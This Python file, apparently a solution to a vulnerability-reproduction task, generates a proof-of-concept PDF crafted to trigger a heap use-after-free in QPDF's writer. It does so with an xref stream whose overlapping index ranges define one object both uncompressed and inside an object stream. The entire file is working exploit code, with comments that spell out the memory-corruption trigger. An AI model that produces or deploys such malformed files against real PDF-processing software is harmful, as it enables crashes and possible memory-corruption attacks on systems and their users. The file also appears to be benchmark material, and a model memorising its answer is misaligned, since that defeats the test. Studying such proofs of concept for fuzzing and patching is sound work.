import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Generate a Proof-of-Concept PDF that triggers Heap Use-After-Free in QPDF.
        # The vulnerability is in QPDFWriter::preserveObjectStreams and getCompressibleObjSet
        # when processing multiple entries for the same object ID (one compressed, one uncompressed).
        
        objects = []
        offsets = {}
        
        # PDF 1.5 Header
        header = b"%PDF-1.5\n%\xE2\xE3\xCF\xD3\n"
        current_pos = len(header)
        
        def add_obj(oid, content):
            nonlocal current_pos
            obj_data = f"{oid} 0 obj\n{content}\nendobj\n".encode('latin1')
            offsets[oid] = current_pos
            objects.append(obj_data)
            current_pos += len(obj_data)

        def add_stream(oid, dic, data, compress=False):
            nonlocal current_pos
            if compress:
                data = zlib.compress(data)
                dic += " /Filter /FlateDecode"
            
            # Construct stream object
            head = f"{oid} 0 obj\n<< {dic} /Length {len(data)} >>\nstream\n".encode('latin1')
            foot = b"\nendstream\nendobj\n"
            full = head + data + foot
            offsets[oid] = current_pos
            objects.append(full)
            current_pos += len(full)

        # 1: Catalog
        add_obj(1, "<< /Type /Catalog /Pages 2 0 R >>")
        
        # 2: Pages
        add_obj(2, "<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        
        # 3: Page
        add_obj(3, "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>")
        
        # 4: Empty Content
        add_stream(4, "", b" ")
        
        # 5: Victim Object (Uncompressed definition)
        # We define this object normally in the file.
        add_obj(5, "<< /Type /Annot /Subtype /Text /Contents (Uncompressed) >>")
        
        # 6: ObjStm (contains 5 Compressed)
        # This Object Stream contains object 5.
        # Format for ObjStm data: "obj_num offset" pairs, then object contents.
        # "5 0 " -> Object 5 is at offset 0
        stm_pairs = b"5 0 "
        stm_obj = b"<< /Type /Annot /Subtype /Text /Contents (Compressed) >>"
        full_stm = stm_pairs + stm_obj
        # /First is the offset to the start of object contents
        add_stream(6, f"/Type /ObjStm /N 1 /First {len(stm_pairs)}", full_stm, compress=True)

        # 7: XRef Stream
        # We create overlapping ranges to define Object 5 twice.
        # Range 1: [0 6] -> Objects 0, 1, 2, 3, 4, 5 (mapped to uncompressed offset)
        # Range 2: [5 1] -> Object 5 (mapped to compressed stream 6 index 0)
        # Range 3: [6 2] -> Objects 6, 7
        
        rows = []
        # 0: Free
        rows.append(b'\x00\x00\x00\xff')
        # 1, 2, 3, 4: Regular offsets
        for i in range(1, 5):
            rows.append(b'\x01' + offsets[i].to_bytes(2, 'big') + b'\x00')
        # 5: Defined as Uncompressed (pointing to offsets[5])
        rows.append(b'\x01' + offsets[5].to_bytes(2, 'big') + b'\x00')
        # 5: Defined as Compressed (in ObjStm 6 at index 0)
        # Type 2, Field2=6 (Stream OID), Field3=0 (Index)
        rows.append(b'\x02' + (6).to_bytes(2, 'big') + b'\x00')
        # 6: Regular offset
        rows.append(b'\x01' + offsets[6].to_bytes(2, 'big') + b'\x00')
        # 7: Self offset (will be current_pos)
        offsets[7] = current_pos
        rows.append(b'\x01' + offsets[7].to_bytes(2, 'big') + b'\x00')
        
        xref_data = b''.join(rows)
        # W array defines field widths: 1 byte Type, 2 bytes Offset/ObjNum, 1 byte Gen/Index
        xref_dic = "/Type /XRef /Size 8 /W [1 2 1] /Root 1 0 R /Index [0 6 5 1 6 2]"
        add_stream(7, xref_dic, xref_data, compress=False)
        
        footer = f"startxref\n{offsets[7]}\n%%EOF\n".encode('latin1')
        
        return header + b"".join(objects) + footer